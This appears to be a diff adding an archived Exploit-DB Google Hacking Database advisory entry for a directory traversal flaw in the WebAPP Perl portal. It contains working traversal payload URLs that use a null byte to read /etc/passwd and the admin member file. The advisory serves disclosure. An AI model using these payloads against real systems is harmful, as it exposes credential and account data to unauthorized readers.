@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/463
+Category:         Advisories and Vulnerabilities
+Published Date:   2004-09-07
+Author:           anonymous
+GoogleDork:       WebAPP directory traversal
+Description:      WebAPP directory traversal
+
+
+WebAPP is advertised as the internet's most feature rich, easy to run PERL based portal system. The WebAPP system has a serious reverse directory traversal vulnerabilityhttp:///cgi-bin/index.cgi?action=topics&amp;viewcat=../../../../../../../etc/passwd%00http:///cgi-bin/index.cgi?action=topics&amp;viewcat=../../db/members/admin.dat%00Detailed info : http://www.packetstormsecurity.com/0408-exploits/webapp.traversal.txtCredits goes to PhTeam for discovering this vulnerability.
